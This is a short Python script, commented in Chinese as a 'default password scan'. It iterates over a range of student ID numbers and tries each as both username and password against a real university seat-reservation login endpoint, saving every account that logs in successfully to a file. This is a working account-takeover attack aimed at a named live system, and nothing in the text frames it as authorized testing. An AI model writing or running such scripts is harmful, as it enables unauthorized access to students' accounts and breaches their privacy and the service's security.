# !/usr/bin/env python
# coding=utf-8
import requests
import json

# 默认密码扫描

url = 'http://seat.ujn.edu.cn/rest/auth'

def isDefaultPassword(username):
    params = {
        'username': username,
        'password': username
    }
    r = requests.get(url, params=params)
    print(str(i)+r.text)
    response = json.loads(r.text)
    # print(response['status'])
    # print(response['data']['token'])

    return response['status'] == 'success'


if __name__ == '__main__':
    # isDefaultPassword('220140421164')
    startNo = 220170421001
    endNo = 220170421555
    f = open(str(startNo)+'.txt', 'w')
    for i in range(startNo, endNo):
        if isDefaultPassword(i):
            f.write(str(i)+"\n")
    f.close()










